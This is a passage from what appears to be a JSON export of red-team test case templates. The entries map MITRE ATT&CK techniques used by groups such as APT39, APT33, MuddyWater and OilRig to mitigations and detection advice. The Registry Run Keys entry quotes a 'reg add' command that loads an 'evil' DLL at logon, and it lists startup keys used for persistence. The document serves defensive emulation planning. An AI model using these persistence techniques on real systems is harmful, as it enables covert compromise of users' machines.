contain [PowerShell](https://attack.mitre.org/techniques/T1086) commands. Payloads may be included into the .lnk file itself, or be downloaded from a remote server.(Citation: FireEye APT29 Nov 2018)(Citation: PWC Cloud Hopper Technical Annex April 2017) \n\nWhile User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.","command":"[APT39](https://attack.mitre.org/groups/G0087) has sent spearphishing emails in an attempt to lure users to click on a malicious attachment or link.Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.\n---\nApplication whitelisting may be able to prevent the running of executables masquerading as other files.\n---\nIf a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity.\n---\nIf a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and rar that may be used to conceal malicious files in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5","relationship--4e50db0c-4e54-4266-b675-3b279ec45427","relationship--1d1525e6-74f2-447d-ba11-9e9c9c552403","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--225ab1b4-f800-4a92-9949-a0f05fce6213","course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db","relationship--8e567361-e2de-4dc6-b953-ec82dc143f58","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--66551074-a1e3-439c-a996-c1f7ca8136e2","course-of-action--21da4fd4-27ad-4e9c-b93d-0b9b14d02c96","relationship--29be2366-5ffb-4499-9984-525f76525326","course-of-action--548bf7ad-e19c-4d74-84bf-84ac4e57f505","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Dunwoody, M., et al. (2018, November 19). Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign. Retrieved November 27, 2018. https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html","Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Proofpoint Staff. (2018, June 8). TA505 shifts with the times. Retrieved May 28, 2019. https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times","PwC and BAE Systems. (2017, April). Operation Cloud Hopper: Technical Annex. Retrieved April 13, 2017. https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf"],"mitreId":"T1204"},"blueTeam":{"successfulDetectionBehaviors":["Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Block execution of code on a system through application whitelisting, blacklisting, and/or script blocking.","Use intrusion detection signatures to block traffic at network boundaries.","Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.","Use user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events. Application whitelisting may be able to prevent the running of executables masquerading as other files.\n\nIf a link is being visited by a user, block unknown or unused files in transit by default that should not be downloaded or by policy from suspicious sites as a best practice to prevent some vectors, such as .scr, .exe, .lnk, .pif, .cpl, etc. Some download scanning devices can open and analyze compressed and encrypted formats, such as zip and RAR that may be used to conceal malicious files in [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).\n\nIf a link is being visited by a user, network intrusion prevention systems and systems designed to scan and remove malicious downloads can be used to block activity. Solutions can be signature and behavior based, but adversaries may construct files in a way to avoid these systems."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--0c77556a-a676-415f-b074-082f8a599cbd","vectrId":"0c77556a-a676-415f-b074-082f8a599cbd","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"772a480f-21d2-4d3b-bc7d-ef9ac82fc46b","templateId":"0c77556a-a676-415f-b074-082f8a599cbd","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Scripting","variant":"APT39 - Scripting","objective":"Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.\n\nScripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)","command":"[APT39](https://attack.mitre.org/groups/G0087) utilized custom scripts to perform internal reconnaissance.Configure Office security settings enable Protected View, to execute within a sandbox environment, and to block macros through Group Policy. Other types of virtualization and application microsegmentation may also mitigate the impact of compromise.\n---\nTurn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44","relationship--a1c62ce5-2f11-415f-bca1-c9021530c090","relationship--11767ed3-e938-4d0f-97dd-2a190e55f8db","course-of-action--b9f0c069-abbe-4a07-a245-2481219a1463","relationship--ef3d56d7-2339-4ee7-9086-293d04230fd4","course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31","relationship--edbef2c6-4005-4fdb-b978-9699a7b2a309","course-of-action--57019a80-8523-46b6-be7d-f763a15a2cc6","intrusion-set--44e43fad-ffcb-4210-abcf-eaaed9735f80"]}],"references":["Alperovitch, D. (2014, July 7). Deep in Thought: Chinese Targeting of National Security Think Tanks. Retrieved November 12, 2014. https://blog.crowdstrike.com/deep-thought-chinese-targeting-national-security-think-tanks/","Felix. (2016, September). Analyzing Malicious Office Documents. Retrieved April 11, 2018. https://www.uperesia.com/analyzing-malicious-office-documents","Hawley et al. (2019, January 29). APT39: An Iranian Cyber Espionage Group Focused on Personal Information. Retrieved February 19, 2019. https://www.fireeye.com/blog/threat-research/2019/01/apt39-iranian-cyber-espionage-group-focused-on-personal-information.html","Metasploit. (n.d.). Retrieved December 4, 2014. http://www.metasploit.com","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Veil Framework. (n.d.). Retrieved December 4, 2014. https://www.veil-framework.com/framework/"],"mitreId":"T1064"},"blueTeam":{"successfulDetectionBehaviors":["Restrict execution of code to a virtual environment on or in transit to an endpoint system.","Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.","Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.\n\nConfigure Office security settings enable Protected View, to execute within a sandbox environment, and to block macros through Group Policy. (Citation: Microsoft Block Office Macros) Other types of virtualization and application microsegmentation may also mitigate the impact of compromise. The risks of additional exploits and weaknesses in implementation may still exist. (Citation: Ars Technica Pwn2Own 2017 VM Escape)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--0d2a8f98-2a70-4d0f-ac20-61a712cd8dca","vectrId":"0d2a8f98-2a70-4d0f-ac20-61a712cd8dca","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"0d2a8f98-2a70-4d0f-ac20-61a712cd8dca","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Uncommonly Used Port","variant":"APT33 - Uncommonly Used Port","objective":"Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.","command":"[APT33](https://attack.mitre.org/groups/G0064) has used ports 808 and 880 for command and control.Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports for that particular network segment.\n---\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--c848fcf7-6b62-4bde-8216-b6c157d48da0","relationship--561e83db-538a-415b-8a7a-08e0009135f0","relationship--bde4d54d-16d7-4a07-a35a-9f0cc6956be2","course-of-action--a0d8db1d-a731-4428-8209-c07175f4b1fe","relationship--d567082e-e9ee-4622-acbd-a592bc3be4a3","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","relationship--de274a43-282a-46e2-9191-7f1acec2e6e4","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage"],"mitreId":"T1065"},"blueTeam":{"successfulDetectionBehaviors":["Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network.","Use intrusion detection signatures to block traffic at network boundaries."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--0d60fc51-83a4-4b3b-89b3-76461616508a","vectrId":"0d60fc51-83a4-4b3b-89b3-76461616508a","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"0d60fc51-83a4-4b3b-89b3-76461616508a","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Owner/User Discovery","variant":"MuddyWater - System Owner/User Discovery","objective":"### Windows\n\nAdversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Mac\n\nOn Mac, the currently logged in user can be identified with <code>users</code>,<code>w</code>, and <code>who</code>.\n\n### Linux\n\nOn Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>.","command":"[MuddyWater](https://attack.mitre.org/groups/G0069) has used malware that can collect the victim’s username.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--03d7999c-1f4c-42cc-8373-e7690d318104","relationship--d1d496f1-fa91-404e-a93a-97670817717a","relationship--f1000a93-e87d-4acf-b71d-73c3bb05fd75","course-of-action--16f144e4-c780-4ed2-98b4-55d14e2dfa44","intrusion-set--269e8108-68c6-4f99-b911-14b2e765dec2"]}],"references":["Kaspersky Lab's Global Research & Analysis Team. (2018, October 10). MuddyWater expands operations. Retrieved November 2, 2018. https://securelist.com/muddywater/88059/"],"mitreId":"T1033"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system users, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--0f2f5ac8-eaa2-4332-8bf3-60ecdc149354","vectrId":"0f2f5ac8-eaa2-4332-8bf3-60ecdc149354","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"69a00d73-ea90-401c-8ef0-9fcd1785d0b4","templateId":"0f2f5ac8-eaa2-4332-8bf3-60ecdc149354","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Custom Command and Control Protocol","variant":"OilRig - Custom Command and Control Protocol","objective":"Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing [Standard Application Layer Protocol](https://attack.mitre.org/techniques/T1071). Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used custom DNS Tunneling protocols for C2.Filter network traffic to look for unusual or non-standard protocols.\n---\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.\n---\nProperly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--f72eb8a8-cd4c-461d-a814-3f862befbf00","relationship--07a550a2-27c1-43f5-8b30-c288441ad5b0","relationship--40865e9d-cfaf-4375-a1c2-ea47fe9e9bda","course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d","relationship--647032ac-0432-4785-9d50-06b9970bcbcb","course-of-action--f3d0c735-330f-43c2-8e8e-51bcfa51e8c3","relationship--82f1fa31-c796-474d-a58a-5ea8250a3118","course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c","relationship--4a8ad303-7a40-4396-8553-daef264dac71","course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016. https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf","Unit 42. (2017, December 15). Unit 42 Playbook Viewer. Retrieved December 20, 2017. https://pan-unit42.github.io/playbook_viewer/"],"mitreId":"T1094"},"blueTeam":{"successfulDetectionBehaviors":["Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.","Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports and through proper network gateway systems. Also ensure hosts are only provisioned to communicate over authorized interfaces.\n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. (Citation: University of Birmingham C2)","Use intrusion detection signatures to block traffic at network boundaries.","Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--16f9e590-f1ae-40d0-bf41-4531b1bbe01c","vectrId":"16f9e590-f1ae-40d0-bf41-4531b1bbe01c","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"47da3f56-d9fc-4735-a343-b57b4ad8eca5","templateId":"16f9e590-f1ae-40d0-bf41-4531b1bbe01c","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Registry Run Keys / Startup Folder","variant":"APT33 - Registry Run Keys / Startup Folder - PowerSploit - Pupy - Empire","objective":"Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nThe <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.\n---\n[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1086) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has deployed a tool known as DarkComet to the Startup folder of a victim.[PowerSploit](https://attack.mitre.org/software/S0194)'s <code>New-UserPersistenceOption</code> Persistence argument can be used to establish via the <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> Registry key.\n---\n[Pupy](https://attack.mitre.org/software/S0192) adds itself to the startup folder or adds itself to the Registry key <code>SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run</code> for persistence.\n---\n[Empire](https://attack.mitre.org/software/S0363) can modify the registry run keys <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> for persistence.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["8e4883bf-d7b7-40ac-b157-ab6431c02b03","76ca4ddf-5174-57a7-2842-70d5af62a25c","5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc","relationship--d15c3d84-9e21-41ac-9728-f97183b63ec6","relationship--9213f7ac-c548-4139-950b-5481a94570f9","course-of-action--8b36d944-f274-4d46-9acd-dbba6927ce7a","tool--13cd9151-83b7-410d-9f98-25d0f0d1d80d","relationship--7b06929c-1b23-4efc-9fc1-64552d5fbdb2","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--d38177b0-03c0-4c59-afa6-eea94a372daa","tool--3433a9e8-1c47-4320-b9bf-ed449061d1c3","relationship--6cc7fc62-740a-47c4-988c-bdd9c5880c3f","intrusion-set--fbd29c89-18ba-4c2d-b792-51c0adee049f"]}],"references":["(Citation: Github PowerShell Empire)","Graeber, M. (2014, July 8). PowerSploit. Retrieved February 6, 2018. http://www.powershellmagazine.com/2014/07/08/powersploit/","Microsoft. (2018, August 20). Description of the RunOnceEx Registry Key. Retrieved June 29, 2018. https://support.microsoft.com/help/310593/description-of-the-runonceex-registry-key","Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014. http://msdn.microsoft.com/en-us/library/aa376977","Moe, O. (2018, March 21). Persistence using RunOnceEx - Hidden from Autoruns.exe. Retrieved June 29, 2018. https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","PowerShellMafia. (2012, May 26). PowerSploit - A PowerShell Post-Exploitation Framework. Retrieved February 6, 2018. https://github.com/PowerShellMafia/PowerSploit","PowerSploit. (n.d.). PowerSploit. Retrieved February 6, 2018. http://powersploit.readthedocs.io","Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016. https://technet.microsoft.com/en-us/sysinternals/bb963902","Schroeder, W., Warner, J., Nelson, M. (n.d.). Github PowerShellEmpire. Retrieved April 28, 2016. https://github.com/PowerShellEmpire/Empire","Security Response attack Investigation Team. (2019, March 27). Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S.. Retrieved April 10, 2019. https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage","Stepanic, D. (2018, September 2). attck_empire: Generate ATT&CK Navigator layer file from PowerShell Empire agent logs. Retrieved March 11, 2019. https://github.com/dstepanic/attck_empire","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf"],"mitreId":"T1060"},"blueTeam":{"successfulDetectionBehaviors":["Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting (Citation: Beechey 2010) tools like AppLocker (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs 